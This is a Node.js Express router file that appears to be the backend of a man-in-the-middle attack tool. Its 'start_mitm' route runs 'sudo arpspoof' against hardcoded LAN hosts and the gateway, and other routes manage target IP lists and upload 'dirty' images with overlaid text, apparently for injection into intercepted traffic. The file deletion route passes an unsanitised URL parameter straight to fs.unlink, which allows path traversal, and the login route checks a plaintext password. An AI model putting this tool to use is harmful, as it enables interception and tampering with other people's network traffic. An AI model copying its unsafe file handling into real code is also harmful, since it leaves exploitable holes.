var express = require('express');
var bodyParser = require('body-parser');
var fs = require('fs');
var exec = require('child_process').exec;
var Jimp = require("jimp");

var router = express.Router();

var urlencodedParser = bodyParser.urlencoded({extended: false});

var user = require('../models/user');
var ip = require('../models/ip');

var ips = ["192.168.1.38"];

router.get("/get/dirty_images", function(req, res, next){

    var path = __dirname +"\\..\\public\\dist\\img";

    fs.readdir(path, function(err, items) {
        res.send(items);
    });
});

router.post("/add/dirty_image", urlencodedParser, function(req, res, next){

    if (req.files) {
        var image = req.files.image;
        var text = req.body.text;
        
        image.mv(__dirname + '/../public/dist/img/' + image.name, function (err) {
            if (err) {
                res.send(false);
            }
            else {
                if(text){
                  Jimp.read(__dirname + '/../public/dist/img/' + image.name, function (err, jimage) {
                    Jimp.loadFont(Jimp.FONT_SANS_32_BLACK).then(function (font) {

                      jimage.fade(0.7).print(font, 10, 10, text).write(__dirname + '/../public/dist/img/' + image.name, function(){
                        res.send(true);
                      });
                    });
                  });
                }else{
                  res.send(true);
                }
            }
        });
    } else {
        res.send(false);
    }
});

router.delete("/del/dirty_image=:image", function(req, res, next){
    var image = req.params.image;

    var file = __dirname + '/../public/dist/img/' + image;
    fs.exists(file, function (exist) {
        if (exist) {
            fs.unlink(file);
            res.send(true);
        }else{
            res.send(false);
        }
    });
});

router.post("/login", urlencodedParser, function(req, res, next){
    var username = req.body.username;
    var password = req.body.password;

    user.get_user_by_x_y(["username", "password"], [username, password], function(result){
        res.send(result);
    })
});

router.get("/start_mitm", function(req, res, next){

    var command = "sudo arpspoof -i wlan0 -t 192.168.1.52 192.168.1.1 %% sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.52" ;

    exec(command, function(error, stdout, stderr) {
        if(!error){
            res.send(true);
        }else{
            res.send(false);
        }
    });
});

router.get("/stop_mitm", function(req, res, next){

    var command = "sudo killall arpspoof";

    exec(command, function(error, stdout, stderr) {
        if(!error){
            res.send(true);
        }else{
            res.send(false);
        }
    });
});

router.get("/get/ips", function(req, res, next){
  ip.get_ip_by_x_y([], [], function(result){
      res.send(result);
  })
});

router.get("/add/ip=:ip", function(req, res, next){
    ip.add_ip(req.params.ip, function(result){
        res.send(result);
    })
});

router.delete("/del/ip=:ip", function(req, res, next){
    ip.delete_ip(req.params.ip, function(result){
        res.send(result);
    })
});

module.exports = router;
